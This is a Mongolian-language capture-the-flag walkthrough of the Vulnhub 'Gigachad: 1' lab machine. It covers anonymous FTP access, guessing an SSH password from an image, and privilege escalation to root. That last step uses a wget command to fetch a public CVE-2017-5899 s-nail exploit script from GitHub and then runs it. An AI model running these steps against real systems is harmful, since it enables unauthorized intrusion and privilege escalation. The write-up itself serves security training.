# Machine-7 "Gigachad : 1 Vulnhub"
**1.** Target-ын мэдэээл авах **netdiscover** командыг хийснээр бидний зорилтот IP гэж юу болохыг харах боломжтой

![image](https://github.com/Bultuush/Machine-7/assets/129934501/57e19211-1c99-4160-9a0a-115fd28c3d9f)

**2.** Дараа нь бид nmap ашиглан нээлттэй портуудыг олох хэрэгтэй.

![image](https://github.com/Bultuush/Machine-7/assets/129934501/31ea9c37-d3ac-4e8b-99d7-8b220448f718)

Хэрэглэгчийн flag ашиглаж байна:
Бид **FTP (21)**, **SSH (22)** болон **HTTP (80)** гэсэн гурван нээлттэй портыг олж илрүүлсэн.

Бид 80-р портоор эхэлж болно, гэхдээ вэбсайтад юу ч байхгүй

![image](https://github.com/Bultuush/Machine-7/assets/129934501/7dbc2715-c2b7-4742-b1c6-46fb4f7c0ff4)

FTP-ийн хувьд нэргүй нэвтрэх боломжтой гэдгийг бид харж байна. Тиймээс бид FTP руу нэвтрэхийг оролдох болно

ftp 192.168.1.5

Хэрэглэгчийн нэр үл мэдэгдэх бөгөөд нууц үг хоосон байх болно (нууц үг асуух үед enter дарна уу)

![image](https://github.com/Bultuush/Machine-7/assets/129934501/85320410-8128-4fed-b6a7-022e12a70207)

Бид файлуудыг үзэхийн тулд **dir** эсвэл **ls** командыг ашиглана. Таны харж байгаагаар бид chadinfo нэртэй файлыг олсон

Бид get командыг ашиглан файлыг татаж авах болно

![image](https://github.com/Bultuush/Machine-7/assets/129934501/44b5794a-1788-40bd-abc1-3ab583d83221)

Одоо cat ашиглан файлыг нээцгээе

![image](https://github.com/Bultuush/Machine-7/assets/129934501/dc1ef91f-0256-4496-9fa6-d9735abdcd2a)

Бид хэрэглэгчийн нэрийг chad гэж авсан бөгөөд нууц үгийн хувьд тэд бидэнд /drippinchad.png лавлахыг өгсөн. Үүнийг шалгаж үзье

Хөтөч дээр http://192.168.1.17/drippinchad.png-г нээсний дараа бид доорх хуудсыг авна.

![image](https://github.com/Bultuush/Machine-7/assets/129934501/d2f675b3-306b-49e1-a637-e8272fe3a0bb)

Тайлбарын дагуу нууц үг нь зураг дээрх газартай холбоотой байх ёстой. Хэрэв та энэ газрыг мэддэг бол доорх алхмуудыг алгасана уу. Хэрэв та мэдэхгүй бол бид зургийг татаж аваад Google дээр reverse image хайх болно

Google Images руу очоод Камерын дүрс дээр дарна уу

Одоо файлуудыг үзэж, зургаа оруулна уу

Та энэ газрыг харуулсан зарим холбоосыг харах болно

![image](https://github.com/Bultuush/Machine-7/assets/129934501/ea7c0372-505f-49bf-9199-9ebd148eb56c)

Би хоёр дахь холбоосыг дагаж, нэр нь Охины цамхаг болохыг олж мэдэв

Бид порт 22 (SSH) нээлттэй байгааг олж мэдсэн тул бид chad (бид chadinfo файлаас авсан) хэрэглэгчээр нэвтэрч, охины цамхагтай холбоотой нууц үгийг тааварлах болно.

Хэсэг хугацааны дараа би нууц үг нь maidenstower болохыг олж мэдэв

Тиймээс бид SSH-д хэрэглэгчийн **user:chad**, **password:maidenstower**-ээр нэвтрэх болно

ssh chad@192.168.1.17

![image](https://github.com/Bultuush/Machine-7/assets/129934501/b855a6b4-f480-45c2-a076-b03ec585dac5)

ls-ийг хийсний дараа бид хэрэглэгчийн flag-ынхаа user.txt-г авсан

![image](https://github.com/Bultuush/Machine-7/assets/129934501/13c4a110-d258-44f7-92e9-830d5b0e27ba)

Эрхийг нэмэгдүүлэхийн тулд бид chad хэрэглэгчийн sudo зөвшөөрлийг хайж олох боломжтой.

**find / -perm -4000 -төрөл f -exec ls -la {} 2>/dev/null \;**

Энэ команд нь setuid бит тохируулсан (`-perm -4000`) болон файлын төрлийн (`-type f`) файлуудыг бүхэлд нь файлын системээс (`/`) хайдаг. Дараа нь эдгээр файл бүр дээр `ls -la`-г ажиллуулж, тэдгээрийн дэлгэрэнгүйг жагсаана. `2>/dev/null` хэсэг нь зөвшөөрөгдөөгүй алдааг дарахын тулд алдааны мэдээг `/dev/null` руу дахин чиглүүлдэг.

![image](https://github.com/Bultuush/Machine-7/assets/129934501/843c797e-83ac-429b-8f51-07a18a9509d4)

Үйлчилгээг судалсны дараа би шуудангаар ашигладаг **s-nail** үйлчилгээг олсон. Энэ нь мөн **CVE-2017–5899**-д ашиглах боломжтой давуу эрх нэмэгдүүлэх боломжуудтай.

![image](https://github.com/Bultuush/Machine-7/assets/129934501/9c8ba76d-e85c-459c-9134-009dd66abf5e)

Би доорх **Github exploit**-ийг ачаалал болгон ашигласан

![image](https://github.com/Bultuush/Machine-7/assets/129934501/6159c346-938b-4900-98bd-a5d8dcdb2b93)

Home лавлах дотроос **wget** ашиглан **exploit.sh** татаж авна уу

**wget https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2017-5899/exploit.sh**

![image](https://github.com/Bultuush/Machine-7/assets/129934501/2d2349bf-6d7e-4ef8-93b1-f15d8be95123)

Одоо бид **exploit.sh**-д chmod ашиглан гүйцэтгэх зөвшөөрлийг өгөх болно

**chmod 777 exploit.sh**

Тэгээд бид **exploit**-ийг ажиллуулна

**./exploit.sh**

![image](https://github.com/Bultuush/Machine-7/assets/129934501/834ffd21-b263-45c9-8469-3404ba269966)

Бид **success** мессежийг хүлээн авах бөгөөд бид **root shell** авах болно

![image](https://github.com/Bultuush/Machine-7/assets/129934501/f405ac23-a57e-4961-8a33-1c944553a210)

/root лавлах руу оч, бид root.txt үндсэн туг болох сүүлчийн тугийг авлаа!

![image](https://github.com/Bultuush/Machine-7/assets/129934501/fd6b703d-159c-4bb6-9507-1bd7250c271e)
